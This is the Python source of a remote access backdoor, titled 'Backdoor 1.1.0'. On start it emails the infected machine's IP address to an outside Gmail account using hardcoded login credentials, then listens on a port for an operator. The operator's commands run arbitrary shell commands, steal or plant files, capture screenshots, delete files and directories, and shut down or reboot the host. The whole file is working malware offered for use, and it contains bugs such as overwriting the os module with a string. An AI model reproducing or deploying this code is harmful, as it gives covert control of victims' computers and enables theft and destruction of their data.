import socket
import subprocess
import os
import sys
import platform
import smtplib
from PIL import ImageGrab
from pathlib import Path
import time

#Get started
print('''            ╔══╗─╔══╗╔══╗╔╗╔══╗╔══╗─╔══╗╔══╗╔═══╗
            ║╔╗║─║╔╗║║╔═╝║║║╔═╝║╔╗╚╗║╔╗║║╔╗║║╔═╗║
            ║╚╝╚╗║╚╝║║║──║╚╝║──║║╚╗║║║║║║║║║║╚═╝║
            ║╔═╗║║╔╗║║║──║╔╗║──║║─║║║║║║║║║║║╔╗╔╝
            ║╚═╝║║║║║║╚═╗║║║╚═╗║╚═╝║║╚╝║║╚╝║║║║║
            ╚═══╝╚╝╚╝╚══╝╚╝╚══╝╚═══╝╚══╝╚══╝╚╝╚╝''')

print('Backdoor 1.1.0 [MSC v.2021 64 bit(AMD64)] on win32' + '\n' + 'Type "help", for more information.')

#Paths
HOST = socket.gethostbyname(socket.gethostname())
PORT = 5768
email = 'programming.developcode@gmail.com'
psw = 'pavel08180919'
message = HOST
pwd = 'pavel08180919'
auth_try = 0

#Functions
def Systeminfo():
    return (platform.machine(),platform.node(),platform.platform())
def change(path):
    os.chdir(path)
#IP address
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email,psw)
server.sendmail(email,'pws15548@gmail.com',message)
server.quit()

#Server
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((HOST,PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
s.listen()

#Backdoor
while True:
    client,addr = s.accept()
    print(f'[+] {addr} Client connected to the server')
    command = client.recv(4096)
    command = command.decode()
    if command == 'system':
        sysinfo = Systeminfo()
        sysinfo = str(sysinfo)
        client.send(sysinfo.encode())
    elif command == 'exit()' or command == 'exit':
        client.close()
        print(f'[+] {addr} Client disconnected to the server!')
    elif command == 'download_file' or command == 'download file':
        file_path = client.recv(5000)
        file_path = file_path.decode()
        file = open(file_path,"rb")
        data = file.read()
        client.send(data)
        print('\n' + 'File downloaded successfully!')
    elif command == 'cmd':
        while True:
            cm_cmd = client.recv(1024)
            cm_cmd = cm_cmd.decode()
            if cm_cmd == 'exit' or cm_cmd == 'exit()':
                client.close()
                print(f'[+] {addr} Client disconnected to the server!')
                break
            proc = subprocess.Popen(cm_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout = proc.stdout.read() + proc.stderr.read()
            os= str(platform.platform())
            if os.startswith('Windows'):
                output = stdout.decode('cp866')
            elif os.startswith('Linux'):
                output = stdout.decode('UTF-8')
            elif os.startswith('Darwin'):
                output = stdout.decode('cp1251')
            client.send(output.encode())
            print(output)
    elif command == 'help':
        pass
    elif command == 'upload_file' or command == 'upload file':
        filename = client.recv(4096)
        path = filename.decode()
        data = client.recv(9000000)
        text = data.decode('utf-8')
        print(text)
        new_file = open(path,"w+",encoding='utf-8')
        new_file.write(text)
        new_file.close()
    elif command == 'shutdown':
        answer = 'Shutdown!'
        answer_2 = 'Computer is off!'
        answer_3 = ('\n' + answer + '\n' + answer_2)
        os= str(platform.platform())
        if os.startswith('Windows'):
            client.send(answer_3.encode())
            os.system('shutdown /p /f')
        elif os.startswith('Linux'):
            client.send(answer_3.encode())
            os.system('systemctl poweroff')
        elif os.startswith('Darwin'):
            client.send(answer_3.encode())
            shut_down = ["shutdown", "-f", "-s", "-t", "30"]
            subprocess.call(shut_down)
    elif command == 'reboot':
        answer = 'Rebooted!'
        answer_2 = 'Computer rebooted!'
        answer_3 = ('\n' + answer + '\n' + answer_2)
        os= str(platform.platform())
        if os.startswith('Windows'):
            client.send(answer_3.encode())
            os.system("shutdown -t 0 -r -f")
        elif os.startswith('Linux'):
            client.send(answer_3.encode())
            subprocess.check_call(['systemctl', 'reboot', '-i'])
        elif os.startswith('Darwin'):
            client.send(answer_3.encode())
            re_start = ["shutdown", "-f", "-r", "-t", "30"]
            subprocess.call(re_start)
    elif command == 'hibernation':
        answer = 'Hibernation!'
        answer_2 = 'The computer is in sleep mode!'
        answer_3 = ('\n' + answer + '\n' + answer_2)
        os= str(platform.platform())
        if os.startswith('Windows'):
            client.send(answer_3.encode())
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0") 
        elif os.startswith('Linux'):
            client.send('Error of hibernation!')
        elif os.startswith('Darwin'):
            client.send(answer_3.encode())
            subprocess.call('caffeinate')
    elif command == 'mkdir' or command == 'make dir':
        name_dir = client.recv(4096)
        name_dir = name_dir.decode()
        if not os.path.isdir(name_dir):
            os.mkdir(name_dir)
            client.send('Directory create successfuly!'.encode())
        else:
            client.send('Failed to create directory!'.encode())
    elif command == 'screenshot' or command == 'screen':
        home = str(Path.home())
        img = ImageGrab.grab()
        filename = 'Screenshot.png'
        img.save(filename)
        client.send(('Screenshot saved as: ' + filename + '\n').encode())
        path = home + '\Screenshot.png'
        image = open(path,'rb')
        data = image.read()
        client.send(data)
    elif command.startswith('cd') or command == 'path':
        path = client.recv(4096)
        path = path.decode()
        change(path)
    elif command == 'remove file':
        file = client.recv(4096)
        file = file.decode()
        name = (os.getcwd() + '\{}'.format(file))
        os.remove(name)
    elif command == 'remove dir' or command == 'remove directory' or command == 'remove path':
        path = client.recv(4096)
        path = path.decode()
        dir = (os.getcwd() + '\{}'.format(path))
        print(dir)
        os.removedirs(dir)